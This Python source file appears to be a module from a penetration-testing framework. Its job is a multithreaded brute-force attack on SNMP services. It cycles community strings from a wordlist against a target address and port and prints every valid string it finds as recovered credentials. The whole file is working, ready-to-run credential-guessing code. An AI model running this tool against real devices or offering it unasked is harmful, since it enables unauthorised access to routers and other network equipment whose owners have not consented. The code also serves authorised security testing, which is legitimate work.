import threading

from pysnmp.entity.rfc3413.oneliner import cmdgen

import Base.Validators as Validators
import Wordlists
from Base.Exploits import Exploit, Option
from Utils import multi, print_error, print_success, print_status, printTable, boolify, LockedIterator


class Exploit(Exploit):
    """
    Module performs bruteforce attack against SNMP service.
    If valid community string is found, it is displayed to the user.
    """
    __info__ = {
        'name': 'credentials/snmp/bruteforce',
        'name': 'SNMP Bruteforce',
        'description': 'Module performs bruteforce attack against SNMP service. '
                       'If valid community string is found, it is displayed to the user.',
        'authors': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',
            'D0ubl3G <d0ubl3g[at]protonmail.com>',
        ],
        'references': [
            'https://github.com/dark-lbp/isf',
        ],
        'devices': [
            'Multi',
        ],
    }

    target = Option('', 'Target IP address or file with target:port (file://)')
    port = Option(161, 'Target port', validators=Validators.integer)
    version = Option(2, 'Snmp version 1:v1, 2:v2c', validators=Validators.integer)
    threads = Option(8, 'Number of threads')
    snmp = Option(Wordlists.snmp, 'Community string or file with community strings (file://)')
    verbosity = Option('yes', 'Display authentication attempts')
    stop_on_success = Option('yes', 'Stop on first valid community string')
    strings = []

    def run(self):
        self.strings = []
        self.attack()

    @multi
    def attack(self):
        # todo: check if service is up
        if self.snmp.startswith('file://'):
            snmp = open(self.snmp[7:], 'r')
        else:
            snmp = [self.snmp]

        collection = LockedIterator(snmp)
        self.run_threads(self.threads, self.target_function, collection)

        if len(self.strings):
            print_success("Credentials found!")
            headers = ("Target", "Port", "Community Strings")
            printTable(headers, *self.strings)
        else:
            print_error("Valid community strings not found")

    def target_function(self, running, data):
        module_verbosity = boolify(self.verbosity)
        name = threading.current_thread().name

        print_status(name, 'thread is starting...', verbose=module_verbosity)

        cmdGen = cmdgen.CommandGenerator()
        while running.is_set():
            try:
                string = data.next().strip()

                errorIndication, errorStatus, errorIndex, varBinds = cmdGen.getCmd(
                    cmdgen.CommunityData(string, mpModel=self.version - 1),
                    cmdgen.UdpTransportTarget((self.target, self.port)),
                    '1.3.6.1.2.1.1.1.0',
                )

                if errorIndication or errorStatus:
                    print_error("Target: {}:{} {}: Invalid community string - String: '{}'"
                                .format(self.target, self.port, name, string), verbose=module_verbosity)
                else:
                    if boolify(self.stop_on_success):
                        running.clear()
                    print_success("Target: {}:{} {}: Valid community string found - String: '{}'"
                                  .format(self.target, self.port, name, string), verbose=module_verbosity)
                    self.strings.append((self.target, self.port, string))

            except StopIteration:
                break

        print_status(name, 'thread is terminated.', verbose=module_verbosity)
